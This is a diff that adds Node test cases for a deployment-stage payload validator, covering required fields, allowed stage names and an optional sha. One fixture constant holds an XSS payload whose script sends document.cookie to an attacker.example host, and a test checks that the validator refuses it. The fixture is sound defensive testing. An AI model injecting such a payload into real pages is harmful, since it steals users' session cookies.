@@ -12,9 +12,11 @@ import assert from 'node:assert/strict';
 
 import {
   ACCEPTANCE_RESULTS,
+  DEPLOYMENT_STAGES,
   whyNotADirectoryName,
   whyNotAWritableRecord,
 } from '../api/lib/contract.mjs';
+import { validateDeploymentTransitionPayload } from '../api/lib/payload.mjs';
 import * as schema from '../src/schema.mjs';
 
 test('contract: the acceptance vocabulary is closed, frozen and exactly pass/fail', () => {
@@ -133,4 +135,89 @@ test('record rule: a path that is not already trimmed is refused, not silently t
 test('record rule: whitespace INSIDE a path is fine — records may have spaces in their names', () => {
   // The fixture ships `docs/field notes.html`, so this is not hypothetical.
   assert.equal(whyNotAWritableRecord('docs/field notes.md'), '');
+});
+
+// --- validateDeploymentTransitionPayload -----------------------------------------------------------
+//
+// Modeled on `validateAcceptancePayload` (api/lib/payload.mjs:140), field for field, with one
+// deliberate omission: a deployment transition is feature-level — a workstream moving to a new
+// stage — not milestone-level, so there is no `milestone` field and no `MILESTONE_ID` check here.
+
+// Verbatim from writeback-handlers.test.mjs's own XSS fixture, reused rather than re-typed so the
+// two suites are provably testing the same refused input, not two strings that merely look alike.
+const XSS =
+  '<img src=x onerror="alert(1)"><script>fetch("https://attacker.example/"+document.cookie)</script>';
+
+test('deployment transition: a valid payload with no note validates', () => {
+  const result = validateDeploymentTransitionPayload({
+    workstream: 'a-stream',
+    stage: 'staging',
+    sha: 'a'.repeat(40),
+  });
+  assert.equal(result.ok, true);
+  assert.deepEqual(result.value, {
+    workstream: 'a-stream',
+    stage: 'staging',
+    note: null,
+    sha: 'a'.repeat(40),
+  });
+});
+
+test('deployment transition: a valid payload with a note validates', () => {
+  const result = validateDeploymentTransitionPayload({
+    workstream: 'a-stream',
+    stage: 'release',
+    note: 'Promoted after the M8 acceptance run passed.',
+    sha: 'a'.repeat(40),
+  });
+  assert.equal(result.ok, true);
+  assert.equal(result.value.note, 'Promoted after the M8 acceptance run passed.');
+});
+
+test('deployment transition: a missing workstream is refused by name', () => {
+  const result = validateDeploymentTransitionPayload({ stage: 'staging' });
+  assert.equal(result.ok, false);
+  assert.match(result.message, /"workstream" is required/);
+});
+
+test('deployment transition: a stage outside the closed vocabulary is refused by name', () => {
+  // `shipping` is not a DEPLOYMENT_STAGES value, and it is not a WORKSTREAM_STAGES value either —
+  // the single catch-all stage WORKSTREAM_STAGES replaced. It exists here as the "not a real stage
+  // at all" case, distinct from `designing` below.
+  const result = validateDeploymentTransitionPayload({
+    workstream: 'atlas',
+    stage: 'shipping',
+    sha: 'a'.repeat(40),
+  });
+  assert.equal(result.ok, false);
+  assert.match(result.message, /must be one of: development, staging, release/);
+  assert.match(result.message, /"shipping"/);
+});
+
+test('a stage transition to a pre-development value is refused by name', () => {
+  const result = validateDeploymentTransitionPayload({
+    workstream: 'atlas', stage: 'designing', sha: 'abc',
+  });
+  assert.equal(result.ok, false);
+  assert.match(result.message, /must be one of: development, staging, release/);
+});
+
+test('deployment transition: an unwritable note is refused the same way the acceptance note is', () => {
+  const result = validateDeploymentTransitionPayload({
+    workstream: 'a-stream',
+    stage: 'staging',
+    note: XSS,
+    sha: 'a'.repeat(40),
+  });
+  assert.equal(result.ok, false);
+  assert.match(result.message, /HTML/i);
+});
+
+test('deployment transition: a missing sha is fine — sha is optional, as it is for acceptance', () => {
+  const result = validateDeploymentTransitionPayload({
+    workstream: 'a-stream',
+    stage: 'staging',
+  });
+  assert.equal(result.ok, true);
+  assert.equal(result.value.sha, null);
 });
